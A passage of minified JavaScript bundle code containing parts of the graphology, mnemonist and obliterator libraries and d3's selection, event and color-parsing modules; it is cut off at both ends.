t(r);return i.import(e),i}}return Ut(St),Ut(Lt),Ut(Nt),Ut(Ct),Ut(Tt),Ut(Gt),St.Graph=St,St.DirectedGraph=Lt,St.UndirectedGraph=Nt,St.MultiGraph=Ct,St.MultiDirectedGraph=Tt,St.MultiUndirectedGraph=Gt,St.InvalidArgumentsGraphError=F,St.NotFoundGraphError=q,St.UsageGraphError=B,St}()},453:(t,e,n)=>{var r=n(650),i=n(993);function o(t,e){if(arguments.length<2)throw new Error("mnemonist/fixed-deque: expecting an Array class and a capacity.");if("number"!=typeof e||e<=0)throw new Error("mnemonist/fixed-deque: `capacity` should be a positive number.");this.ArrayClass=t,this.capacity=e,this.items=new t(this.capacity),this.clear()}o.prototype.clear=function(){this.start=0,this.size=0},o.prototype.push=function(t){if(this.size===this.capacity)throw new Error("mnemonist/fixed-deque.push: deque capacity ("+this.capacity+") exceeded!");var e=(this.start+this.size)%this.capacity;return this.items[e]=t,++this.size},o.prototype.unshift=function(t){if(this.size===this.capacity)throw new Error("mnemonist/fixed-deque.unshift: deque capacity ("+this.capacity+") exceeded!");var e=this.start-1;return 0===this.start&&(e=this.capacity-1),this.items[e]=t,this.start=e,++this.size},o.prototype.pop=function(){if(0===this.size)return;const t=(this.start+this.size-1)%this.capacity;return this.size--,this.items[t]},o.prototype.shift=function(){if(0!==this.size){var t=this.start;return this.size--,this.start++,this.start===this.capacity&&(this.start=0),this.items[t]}},o.prototype.peekFirst=function(){if(0!==this.size)return this.items[this.start]},o.prototype.peekLast=function(){if(0!==this.size){var t=this.start+this.size-1;return t>this.capacity&&(t-=this.capacity),this.items[t]}},o.prototype.get=function(t){if(0!==this.size)return(t=this.start+t)>this.capacity&&(t-=this.capacity),this.items[t]},o.prototype.forEach=function(t,e){e=arguments.length>1?e:this;for(var n=this.capacity,r=this.size,i=this.start,o=0;o<r;)t.call(e,this.items[i],o,this),o++,++i===n&&(i=0)},o.prototype.toArray=function(){var t=this.start+this.size;if(t<this.capacity)return this.items.slice(this.start,t);for(var e=new this.ArrayClass(this.size),n=this.capacity,r=this.size,i=this.start,o=0;o<r;)e[o]=this.items[i],o++,++i===n&&(i=0);return e},o.prototype.values=function(){var t=this.items,e=this.capacity,n=this.size,r=this.start,o=0;return new i((function(){if(o>=n)return{done:!0};var i=t[r];return r++,o++,r===e&&(r=0),{value:i,done:!1}}))},o.prototype.entries=function(){var t=this.items,e=this.capacity,n=this.size,r=this.start,o=0;return new i((function(){if(o>=n)return{done:!0};var i=t[r];return++r===e&&(r=0),{value:[o++,i],done:!1}}))},"undefined"!=typeof Symbol&&(o.prototype[Symbol.iterator]=o.prototype.values),o.prototype.inspect=function(){var t=this.toArray();return t.type=this.ArrayClass.name,t.capacity=this.capacity,Object.defineProperty(t,"constructor",{value:o,enumerable:!1}),t},"undefined"!=typeof Symbol&&(o.prototype[Symbol.for("nodejs.util.inspect.custom")]=o.prototype.inspect),o.from=function(t,e,n){if(arguments.length<3&&"number"!=typeof(n=r.guessLength(t)))throw new Error("mnemonist/fixed-deque.from: could not guess iterable length. Please provide desired capacity as last argument.");var i=new o(e,n);if(r.isArrayLike(t)){var a,u;for(a=0,u=t.length;a<u;a++)i.items[a]=t[a];return i.size=u,i}return r.forEach(t,(function(t){i.push(t)})),i},t.exports=o},650:(t,e,n)=>{var r=n(113),i=n(801);function o(t){return"number"==typeof t.length?t.length:"number"==typeof t.size?t.size:void 0}e.isArrayLike=function(t){return Array.isArray(t)||i.isTypedArray(t)},e.guessLength=o,e.toArray=function(t){var e=o(t),n="number"==typeof e?new Array(e):[],i=0;return r(t,(function(t){n[i++]=t})),n},e.toArrayWithIndices=function(t){var e=o(t),n="number"==typeof e?i.getPointerArray(e):Array,a="number"==typeof e?new Array(e):[],u="number"==typeof e?new n(e):[],c=0;return r(t,(function(t){a[c]=t,u[c]=c++})),[a,u]}},801:(t,e)=>{var n=Math.pow(2,8)-1,r=Math.pow(2,16)-1,i=Math.pow(2,32)-1,o=Math.pow(2,7)-1,a=Math.pow(2,15)-1,u=Math.pow(2,31)-1;e.getPointerArray=function(t){var e=t-1;if(e<=n)return Uint8Array;if(e<=r)return Uint16Array;if(e<=i)return Uint32Array;throw new Error("mnemonist: Pointer Array of size > 4294967295 is not supported.")},e.getSignedPointerArray=function(t){var e=t-1;return e<=o?Int8Array:e<=a?Int16Array:e<=u?Int32Array:Float64Array},e.getNumberType=function(t){return t===(0|t)?-1===Math.sign(t)?t<=127&&t>=-128?Int8Array:t<=32767&&t>=-32768?Int16Array:Int32Array:t<=255?Uint8Array:t<=65535?Uint16Array:Uint32Array:Float64Array};var c={Uint8Array:1,Int8Array:2,Uint16Array:3,Int16Array:4,Uint32Array:5,Int32Array:6,Float32Array:7,Float64Array:8};e.getMinimalRepresentation=function(t,n){var r,i,o,a,u,s=null,h=0;for(a=0,u=t.length;a<u;a++)o=n?n(t[a]):t[a],i=e.getNumberType(o),(r=c[i.name])>h&&(h=r,s=i);return s},e.isTypedArray=function(t){return"undefined"!=typeof ArrayBuffer&&ArrayBuffer.isView(t)},e.concat=function(){var t,e,n,r=0;for(t=0,n=arguments.length;t<n;t++)r+=arguments[t].length;var i=new arguments[0].constructor(r);for(t=0,e=0;t<n;t++)i.set(arguments[t],e),e+=arguments[t].length;return i},e.indices=function(t){for(var n=new(e.getPointerArray(t))(t),r=0;r<t;r++)n[r]=r;return n}},113:(t,e,n)=>{var r=n(844),i=r.ARRAY_BUFFER_SUPPORT,o=r.SYMBOL_SUPPORT;t.exports=function(t,e){var n,r,a,u,c;if(!t)throw new Error("obliterator/forEach: invalid iterable.");if("function"!=typeof e)throw new Error("obliterator/forEach: expecting a callback.");if(Array.isArray(t)||i&&ArrayBuffer.isView(t)||"string"==typeof t||"[object Arguments]"===t.toString())for(a=0,u=t.length;a<u;a++)e(t[a],a);else if("function"!=typeof t.forEach)if(o&&Symbol.iterator in t&&"function"!=typeof t.next&&(t=t[Symbol.iterator]()),"function"!=typeof t.next)for(r in t)t.hasOwnProperty(r)&&e(t[r],r);else for(n=t,a=0;!0!==(c=n.next()).done;)e(c.value,a),a++;else t.forEach(e)}},993:t=>{function e(t){if("function"!=typeof t)throw new Error("obliterator/iterator: expecting a function!");this.next=t}"undefined"!=typeof Symbol&&(e.prototype[Symbol.iterator]=function(){return this}),e.of=function(){var t=arguments,n=t.length,r=0;return new e((function(){return r>=n?{done:!0}:{done:!1,value:t[r++]}}))},e.empty=function(){return new e((function(){return{done:!0}}))},e.fromSequence=function(t){var n=0,r=t.length;return new e((function(){return n>=r?{done:!0}:{done:!1,value:t[n++]}}))},e.is=function(t){return t instanceof e||"object"==typeof t&&null!==t&&"function"==typeof t.next},t.exports=e},844:(t,e)=>{e.ARRAY_BUFFER_SUPPORT="undefined"!=typeof ArrayBuffer,e.SYMBOL_SUPPORT="undefined"!=typeof Symbol}},e={};function n(r){var i=e[r];if(void 0!==i)return i.exports;var o=e[r]={exports:{}};return t[r].call(o.exports,o,o.exports,n),o.exports}n.n=t=>{var e=t&&t.__esModule?()=>t.default:()=>t;return n.d(e,{a:e}),e},n.d=(t,e)=>{for(var r in e)n.o(e,r)&&!n.o(t,r)&&Object.defineProperty(t,r,{enumerable:!0,get:e[r]})},n.o=(t,e)=>Object.prototype.hasOwnProperty.call(t,e),(()=>{"use strict";function t(t,e){return t<e?-1:t>e?1:t>=e?0:NaN}var e,r;1===(e=t).length&&(r=e,e=function(e,n){return t(r(e),n)});var i=Array.prototype;function o(t,e){var n,r,i=t.length,o=-1;if(null==e){for(;++o<i;)if(null!=(n=t[o])&&n>=n)for(r=n;++o<i;)null!=(n=t[o])&&n>r&&(r=n)}else for(;++o<i;)if(null!=(n=e(t[o],o,t))&&n>=n)for(r=n;++o<i;)null!=(n=e(t[o],o,t))&&n>r&&(r=n);return r}function a(t){return null===t?NaN:+t}function u(t,e){var n,r=t.length,i=r,o=-1,u=0;if(null==e)for(;++o<r;)isNaN(n=a(t[o]))?--i:u+=n;else for(;++o<r;)isNaN(n=a(e(t[o],o,t)))?--i:u+=n;if(i)return u/i}function c(t,e){var n,r,i=t.length,o=-1;if(null==e){for(;++o<i;)if(null!=(n=t[o])&&n>=n)for(r=n;++o<i;)null!=(n=t[o])&&r>n&&(r=n)}else for(;++o<i;)if(null!=(n=e(t[o],o,t))&&n>=n)for(r=n;++o<i;)null!=(n=e(t[o],o,t))&&r>n&&(r=n);return r}i.slice,i.map,Math.sqrt(50),Math.sqrt(10),Math.sqrt(2),Array.prototype.slice;var s={value:function(){}};function h(){for(var t,e=0,n=arguments.length,r={};e<n;++e){if(!(t=arguments[e]+"")||t in r)throw new Error("illegal type: "+t);r[t]=[]}return new f(r)}function f(t){this._=t}function l(t,e){for(var n,r=0,i=t.length;r<i;++r)if((n=t[r]).name===e)return n.value}function d(t,e,n){for(var r=0,i=t.length;r<i;++r)if(t[r].name===e){t[r]=s,t=t.slice(0,r).concat(t.slice(r+1));break}return null!=n&&t.push({name:e,value:n}),t}f.prototype=h.prototype={constructor:f,on:function(t,e){var n,r,i=this._,o=(r=i,(t+"").trim().split(/^|\s+/).map((function(t){var e="",n=t.indexOf(".");if(n>=0&&(e=t.slice(n+1),t=t.slice(0,n)),t&&!r.hasOwnProperty(t))throw new Error("unknown type: "+t);return{type:t,name:e}}))),a=-1,u=o.length;if(!(arguments.length<2)){if(null!=e&&"function"!=typeof e)throw new Error("invalid callback: "+e);for(;++a<u;)if(n=(t=o[a]).type)i[n]=d(i[n],t.name,e);else if(null==e)for(n in i)i[n]=d(i[n],t.name,null);return this}for(;++a<u;)if((n=(t=o[a]).type)&&(n=l(i[n],t.name)))return n},copy:function(){var t={},e=this._;for(var n in e)t[n]=e[n].slice();return new f(t)},call:function(t,e){if((n=arguments.length-2)>0)for(var n,r,i=new Array(n),o=0;o<n;++o)i[o]=arguments[o+2];if(!this._.hasOwnProperty(t))throw new Error("unknown type: "+t);for(o=0,n=(r=this._[t]).length;o<n;++o)r[o].value.apply(e,i)},apply:function(t,e,n){if(!this._.hasOwnProperty(t))throw new Error("unknown type: "+t);for(var r=this._[t],i=0,o=r.length;i<o;++i)r[i].value.apply(e,n)}};const p=h;var y="http://www.w3.org/1999/xhtml";const g={svg:"http://www.w3.org/2000/svg",xhtml:y,xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/"};function v(t){var e=t+="",n=e.indexOf(":");return n>=0&&"xmlns"!==(e=t.slice(0,n))&&(t=t.slice(n+1)),g.hasOwnProperty(e)?{space:g[e],local:t}:t}function m(t){return function(){var e=this.ownerDocument,n=this.namespaceURI;return n===y&&e.documentElement.namespaceURI===y?e.createElement(t):e.createElementNS(n,t)}}function _(t){return function(){return this.ownerDocument.createElementNS(t.space,t.local)}}function b(t){var e=v(t);return(e.local?_:m)(e)}function w(){}function x(t){return null==t?w:function(){return this.querySelector(t)}}function k(){return[]}function M(t){return null==t?k:function(){return this.querySelectorAll(t)}}var E=function(t){return function(){return this.matches(t)}};if("undefined"!=typeof document){var A=document.documentElement;if(!A.matches){var S=A.webkitMatchesSelector||A.msMatchesSelector||A.mozMatchesSelector||A.oMatchesSelector;E=function(t){return function(){return S.call(this,t)}}}}const L=E;function N(t){return new Array(t.length)}function C(t,e){this.ownerDocument=t.ownerDocument,this.namespaceURI=t.namespaceURI,this._next=null,this._parent=t,this.__data__=e}C.prototype={constructor:C,appendChild:function(t){return this._parent.insertBefore(t,this._next)},insertBefore:function(t,e){return this._parent.insertBefore(t,e)},querySelector:function(t){return this._parent.querySelector(t)},querySelectorAll:function(t){return this._parent.querySelectorAll(t)}};function T(t,e,n,r,i,o){for(var a,u=0,c=e.length,s=o.length;u<s;++u)(a=e[u])?(a.__data__=o[u],r[u]=a):n[u]=new C(t,o[u]);for(;u<c;++u)(a=e[u])&&(i[u]=a)}function G(t,e,n,r,i,o,a){var u,c,s,h={},f=e.length,l=o.length,d=new Array(f);for(u=0;u<f;++u)(c=e[u])&&(d[u]=s="$"+a.call(c,c.__data__,u,e),s in h?i[u]=c:h[s]=c);for(u=0;u<l;++u)(c=h[s="$"+a.call(t,o[u],u,o)])?(r[u]=c,c.__data__=o[u],h[s]=null):n[u]=new C(t,o[u]);for(u=0;u<f;++u)(c=e[u])&&h[d[u]]===c&&(i[u]=c)}function U(t,e){return t<e?-1:t>e?1:t>=e?0:NaN}function D(t){return function(){this.removeAttribute(t)}}function O(t){return function(){this.removeAttributeNS(t.space,t.local)}}function j(t,e){return function(){this.setAttribute(t,e)}}function z(t,e){return function(){this.setAttributeNS(t.space,t.local,e)}}function P(t,e){return function(){var n=e.apply(this,arguments);null==n?this.removeAttribute(t):this.setAttribute(t,n)}}function I(t,e){return function(){var n=e.apply(this,arguments);null==n?this.removeAttributeNS(t.space,t.local):this.setAttributeNS(t.space,t.local,n)}}function R(t){return t.ownerDocument&&t.ownerDocument.defaultView||t.document&&t||t.defaultView}function F(t){return function(){this.style.removeProperty(t)}}function q(t,e,n){return function(){this.style.setProperty(t,e,n)}}function B(t,e,n){return function(){var r=e.apply(this,arguments);null==r?this.style.removeProperty(t):this.style.setProperty(t,r,n)}}function Y(t,e){return t.style.getPropertyValue(e)||R(t).getComputedStyle(t,null).getPropertyValue(e)}function W(t){return function(){delete this[t]}}function K(t,e){return function(){this[t]=e}}function H(t,e){return function(){var n=e.apply(this,arguments);null==n?delete this[t]:this[t]=n}}function X(t){return t.trim().split(/^|\s+/)}function $(t){return t.classList||new V(t)}function V(t){this._node=t,this._names=X(t.getAttribute("class")||"")}function Z(t,e){for(var n=$(t),r=-1,i=e.length;++r<i;)n.add(e[r])}function J(t,e){for(var n=$(t),r=-1,i=e.length;++r<i;)n.remove(e[r])}function Q(t){return function(){Z(this,t)}}function tt(t){return function(){J(this,t)}}function et(t,e){return function(){(e.apply(this,arguments)?Z:J)(this,t)}}function nt(){this.textContent=""}function rt(t){return function(){this.textContent=t}}function it(t){return function(){var e=t.apply(this,arguments);this.textContent=null==e?"":e}}function ot(){this.innerHTML=""}function at(t){return function(){this.innerHTML=t}}function ut(t){return function(){var e=t.apply(this,arguments);this.innerHTML=null==e?"":e}}function ct(){this.nextSibling&&this.parentNode.appendChild(this)}function st(){this.previousSibling&&this.parentNode.insertBefore(this,this.parentNode.firstChild)}function ht(){return null}function ft(){var t=this.parentNode;t&&t.removeChild(this)}function lt(){return this.parentNode.insertBefore(this.cloneNode(!1),this.nextSibling)}function dt(){return this.parentNode.insertBefore(this.cloneNode(!0),this.nextSibling)}V.prototype={add:function(t){this._names.indexOf(t)<0&&(this._names.push(t),this._node.setAttribute("class",this._names.join(" ")))},remove:function(t){var e=this._names.indexOf(t);e>=0&&(this._names.splice(e,1),this._node.setAttribute("class",this._names.join(" ")))},contains:function(t){return this._names.indexOf(t)>=0}};var pt={},yt=null;function gt(t,e,n){return t=vt(t,e,n),function(e){var n=e.relatedTarget;n&&(n===this||8&n.compareDocumentPosition(this))||t.call(this,e)}}function vt(t,e,n){return function(r){var i=yt;yt=r;try{t.call(this,this.__data__,e,n)}finally{yt=i}}}function mt(t){return function(){var e=this.__on;if(e){for(var n,r=0,i=-1,o=e.length;r<o;++r)n=e[r],t.type&&n.type!==t.type||n.name!==t.name?e[++i]=n:this.removeEventListener(n.type,n.listener,n.capture);++i?e.length=i:delete this.__on}}}function _t(t,e,n){var r=pt.hasOwnProperty(t.type)?gt:vt;return function(i,o,a){var u,c=this.__on,s=r(e,o,a);if(c)for(var h=0,f=c.length;h<f;++h)if((u=c[h]).type===t.type&&u.name===t.name)return this.removeEventListener(u.type,u.listener,u.capture),this.addEventListener(u.type,u.listener=s,u.capture=n),void(u.value=e);this.addEventListener(t.type,s,n),u={type:t.type,name:t.name,value:e,listener:s,capture:n},c?c.push(u):this.__on=[u]}}function bt(t,e,n,r){var i=yt;t.sourceEvent=yt,yt=t;try{return e.apply(n,r)}finally{yt=i}}function wt(t,e,n){var r=R(t),i=r.CustomEvent;"function"==typeof i?i=new i(e,n):(i=r.document.createEvent("Event"),n?(i.initEvent(e,n.bubbles,n.cancelable),i.detail=n.detail):i.initEvent(e,!1,!1)),t.dispatchEvent(i)}function xt(t,e){return function(){return wt(this,t,e)}}function kt(t,e){return function(){return wt(this,t,e.apply(this,arguments))}}"undefined"!=typeof document&&("onmouseenter"in document.documentElement||(pt={mouseenter:"mouseover",mouseleave:"mouseout"}));var Mt=[null];function Et(t,e){this._groups=t,this._parents=e}function At(){return new Et([[document.documentElement]],Mt)}Et.prototype=At.prototype={constructor:Et,select:function(t){"function"!=typeof t&&(t=x(t));for(var e=this._groups,n=e.length,r=new Array(n),i=0;i<n;++i)for(var o,a,u=e[i],c=u.length,s=r[i]=new Array(c),h=0;h<c;++h)(o=u[h])&&(a=t.call(o,o.__data__,h,u))&&("__data__"in o&&(a.__data__=o.__data__),s[h]=a);return new Et(r,this._parents)},selectAll:function(t){"function"!=typeof t&&(t=M(t));for(var e=this._groups,n=e.length,r=[],i=[],o=0;o<n;++o)for(var a,u=e[o],c=u.length,s=0;s<c;++s)(a=u[s])&&(r.push(t.call(a,a.__data__,s,u)),i.push(a));return new Et(r,i)},filter:function(t){"function"!=typeof t&&(t=L(t));for(var e=this._groups,n=e.length,r=new Array(n),i=0;i<n;++i)for(var o,a=e[i],u=a.length,c=r[i]=[],s=0;s<u;++s)(o=a[s])&&t.call(o,o.__data__,s,a)&&c.push(o);return new Et(r,this._parents)},data:function(t,e){if(!t)return p=new Array(this.size()),h=-1,this.each((function(t){p[++h]=t})),p;var n,r=e?G:T,i=this._parents,o=this._groups;"function"!=typeof t&&(n=t,t=function(){return n});for(var a=o.length,u=new Array(a),c=new Array(a),s=new Array(a),h=0;h<a;++h){var f=i[h],l=o[h],d=l.length,p=t.call(f,f&&f.__data__,h,i),y=p.length,g=c[h]=new Array(y),v=u[h]=new Array(y);r(f,l,g,v,s[h]=new Array(d),p,e);for(var m,_,b=0,w=0;b<y;++b)if(m=g[b]){for(b>=w&&(w=b+1);!(_=v[w])&&++w<y;);m._next=_||null}}return(u=new Et(u,i))._enter=c,u._exit=s,u},enter:function(){return new Et(this._enter||this._groups.map(N),this._parents)},exit:function(){return new Et(this._exit||this._groups.map(N),this._parents)},merge:function(t){for(var e=this._groups,n=t._groups,r=e.length,i=n.length,o=Math.min(r,i),a=new Array(r),u=0;u<o;++u)for(var c,s=e[u],h=n[u],f=s.length,l=a[u]=new Array(f),d=0;d<f;++d)(c=s[d]||h[d])&&(l[d]=c);for(;u<r;++u)a[u]=e[u];return new Et(a,this._parents)},order:function(){for(var t=this._groups,e=-1,n=t.length;++e<n;)for(var r,i=t[e],o=i.length-1,a=i[o];--o>=0;)(r=i[o])&&(a&&a!==r.nextSibling&&a.parentNode.insertBefore(r,a),a=r);return this},sort:function(t){function e(e,n){return e&&n?t(e.__data__,n.__data__):!e-!n}t||(t=U);for(var n=this._groups,r=n.length,i=new Array(r),o=0;o<r;++o){for(var a,u=n[o],c=u.length,s=i[o]=new Array(c),h=0;h<c;++h)(a=u[h])&&(s[h]=a);s.sort(e)}return new Et(i,this._parents).order()},call:function(){var t=arguments[0];return arguments[0]=this,t.apply(null,arguments),this},nodes:function(){var t=new Array(this.size()),e=-1;return this.each((function(){t[++e]=this})),t},node:function(){for(var t=this._groups,e=0,n=t.length;e<n;++e)for(var r=t[e],i=0,o=r.length;i<o;++i){var a=r[i];if(a)return a}return null},size:function(){var t=0;return this.each((function(){++t})),t},empty:function(){return!this.node()},each:function(t){for(var e=this._groups,n=0,r=e.length;n<r;++n)for(var i,o=e[n],a=0,u=o.length;a<u;++a)(i=o[a])&&t.call(i,i.__data__,a,o);return this},attr:function(t,e){var n=v(t);if(arguments.length<2){var r=this.node();return n.local?r.getAttributeNS(n.space,n.local):r.getAttribute(n)}return this.each((null==e?n.local?O:D:"function"==typeof e?n.local?I:P:n.local?z:j)(n,e))},style:function(t,e,n){return arguments.length>1?this.each((null==e?F:"function"==typeof e?B:q)(t,e,null==n?"":n)):Y(this.node(),t)},property:function(t,e){return arguments.length>1?this.each((null==e?W:"function"==typeof e?H:K)(t,e)):this.node()[t]},classed:function(t,e){var n=X(t+"");if(arguments.length<2){for(var r=$(this.node()),i=-1,o=n.length;++i<o;)if(!r.contains(n[i]))return!1;return!0}return this.each(("function"==typeof e?et:e?Q:tt)(n,e))},text:function(t){return arguments.length?this.each(null==t?nt:("function"==typeof t?it:rt)(t)):this.node().textContent},html:function(t){return arguments.length?this.each(null==t?ot:("function"==typeof t?ut:at)(t)):this.node().innerHTML},raise:function(){return this.each(ct)},lower:function(){return this.each(st)},append:function(t){var e="function"==typeof t?t:b(t);return this.select((function(){return this.appendChild(e.apply(this,arguments))}))},insert:function(t,e){var n="function"==typeof t?t:b(t),r=null==e?ht:"function"==typeof e?e:x(e);return this.select((function(){return this.insertBefore(n.apply(this,arguments),r.apply(this,arguments)||null)}))},remove:function(){return this.each(ft)},clone:function(t){return this.select(t?dt:lt)},datum:function(t){return arguments.length?this.property("__data__",t):this.node().__data__},on:function(t,e,n){var r,i,o=function(t){return t.trim().split(/^|\s+/).map((function(t){var e="",n=t.indexOf(".");return n>=0&&(e=t.slice(n+1),t=t.slice(0,n)),{type:t,name:e}}))}(t+""),a=o.length;if(!(arguments.length<2)){for(u=e?_t:mt,null==n&&(n=!1),r=0;r<a;++r)this.each(u(o[r],e,n));return this}var u=this.node().__on;if(u)for(var c,s=0,h=u.length;s<h;++s)for(r=0,c=u[s];r<a;++r)if((i=o[r]).type===c.type&&i.name===c.name)return c.value},dispatch:function(t,e){return this.each(("function"==typeof e?kt:xt)(t,e))}};const St=At;function Lt(t){return"string"==typeof t?new Et([[document.querySelector(t)]],[document.documentElement]):new Et([[t]],Mt)}var Nt=0;function Ct(){this._="@"+(++Nt).toString(36)}function Tt(){for(var t,e=yt;t=e.sourceEvent;)e=t;return e}function Gt(t,e){var n=t.ownerSVGElement||t;if(n.createSVGPoint){var r=n.createSVGPoint();return r.x=e.clientX,r.y=e.clientY,[(r=r.matrixTransform(t.getScreenCTM().inverse())).x,r.y]}var i=t.getBoundingClientRect();return[e.clientX-i.left-t.clientLeft,e.clientY-i.top-t.clientTop]}function Ut(t){var e=Tt();return e.changedTouches&&(e=e.changedTouches[0]),Gt(t,e)}function Dt(t,e,n){arguments.length<3&&(n=e,e=Tt().changedTouches);for(var r,i=0,o=e?e.length:0;i<o;++i)if((r=e[i]).identifier===n)return Gt(t,r);return null}function Ot(){yt.stopImmediatePropagation()}function jt(){yt.preventDefault(),yt.stopImmediatePropagation()}function zt(t){var e=t.document.documentElement,n=Lt(t).on("dragstart.drag",jt,!0);"onselectstart"in e?n.on("selectstart.drag",jt,!0):(e.__noselect=e.style.MozUserSelect,e.style.MozUserSelect="none")}function Pt(t,e){var n=t.document.documentElement,r=Lt(t).on("dragstart.drag",null);e&&(r.on("click.drag",jt,!0),setTimeout((function(){r.on("click.drag",null)}),0)),"onselectstart"in n?r.on("selectstart.drag",null):(n.style.MozUserSelect=n.__noselect,delete n.__noselect)}function It(t){return function(){return t}}function Rt(t,e,n,r,i,o,a,u,c,s){this.target=t,this.type=e,this.subject=n,this.identifier=r,this.active=i,this.x=o,this.y=a,this.dx=u,this.dy=c,this._=s}function Ft(){return!yt.button}function qt(){return this.parentNode}function Bt(t){return null==t?{x:yt.x,y:yt.y}:t}function Yt(){return"ontouchstart"in this}function Wt(t,e,n){t.prototype=e.prototype=n,n.constructor=t}function Kt(t,e){var n=Object.create(t.prototype);for(var r in e)n[r]=e[r];return n}function Ht(){}Ct.prototype=function(){return new Ct}.prototype={constructor:Ct,get:function(t){for(var e=this._;!(e in t);)if(!(t=t.parentNode))return;return t[e]},set:function(t,e){return t[this._]=e},remove:function(t){return this._ in t&&delete t[this._]},toString:function(){return this._}},Rt.prototype.on=function(){var t=this._.on.apply(this._,arguments);return t===this._?this:t};var Xt=.7,$t=1/Xt,Vt="\\s*([+-]?\\d+)\\s*",Zt="\\s*([+-]?\\d*\\.?\\d+(?:[eE][+-]?\\d+)?)\\s*",Jt="\\s*([+-]?\\d*\\.?\\d+(?:[eE][+-]?\\d+)?)%\\s*",Qt=/^#([0-9a-f]{3})$/,te=/^#([0-9a-f]{6})$/,ee=new RegExp("^rgb\\("+[Vt,Vt,Vt]+"\\)$"),ne=new RegExp("^rgb\\("+[Jt,Jt,Jt]+"\\)$"),re=new RegExp("^rgba\\("+[Vt,Vt,Vt,Zt]+"\\)$"),ie=new RegExp("^rgba\\("+[Jt,Jt,Jt,Zt]+"\\)$"),oe=new RegExp("^hsl\\("+[Zt,Jt,Jt]+"\\)$"),ae=new RegExp("^hsla\\("+[Zt,Jt,Jt,Zt]+"\\)$"),ue={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,rebeccapurple:6697881,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};function ce(t){var e;return t=(t+"").trim().toLowerCase(),(e=Qt.exec(t))?new de((e=parseInt(e[1],16))>>8&15|e>>4&240,e>>4&15|240&e,(15&e)<<4|15&e,1):(e=te.exec(t))?se(parseInt(e[1],16)):(e=ee.exec(t))?new de(e[1],e[2],e[3],1):(e=ne.exec(t))?new de(255*e[1]/100,255*e[2]/100,255*e[3]/100,1):(e=re.exec(t))?he(e[1],e[2],e[3],e[4]):(e=ie.exec(t))?he(255*e[1]/100,255*e[2]/100,255*e[3]/100,e[4]):(e=oe.exec(t))?pe(e[1],e[2]/100,e[3]/100,1):(e=ae.exec(t))?pe(e[1],e[2]/100,e[3]/100,e[4]):ue.hasOwnProperty(t)?se(ue[t]):"transparent"===t?new de(NaN,NaN,NaN,0):null}function se(t){return new de(t>>16&255,t>>8&255,255&t,1)}function he(t,e,n,r){return r<=0&&(t=e=n=NaN),new de(t,e,n,r)}function fe(t){return t instanceof Ht||(t=ce(t)),t?new de((t=t.rgb()).r,t.g,t.b,t.opacity):new de}function le(t,e,n,r){return 1===arguments.length?fe(t):new de(t,e,n,null==r?1:r)}function de(t,e,n,r){this.r=+t,this.g=+e,this.b=+n,this.opacity=+r}function pe(t,e,n,r){return r<=0?t=e=n=NaN:n<=0||n>=1?t=e=NaN:e<=0&&(t=NaN),new ge(t,e,n,r)}function ye(t,e,n,r){return 1===arguments.length?function(t){if(t instanceof ge)return new ge(t.h,t.s,t.l,t.opacity);if(t instanceof Ht||(t=ce(t)),!t)return new ge;if(t instanceof ge)return t;var e=(t=t.rgb()).r/255,n=t.g/255,r=t.b/255,i=Math.min(e,n,r),o=Math.max(e,n,r),a=NaN,u=o-i,c=(o+i)/2;return u?(a=e===o?(n-r)/u+6*(n<r):n===o?(r-e)/u+2:(e-n)/u+4,u/=c<.5?o+i:2-o-i,a*=60):u=c>0&&c<1?0:a,new ge(a,u,c,t.opacity)}(t):new ge(t,e,n,null==r?1:r)}function ge(t,e,n,r){this.h=+t,this.s=+e,this.l=+n,this.opacity=+r}function ve(t,e,n){return 255*(t<60?e+(n-e)*t/60:t<180?n:t<240?e+(n-e)*(240-t)/60:e)}Wt(Ht,ce,{displayable:function(){return this.rgb().displayable()},toString:function(){return 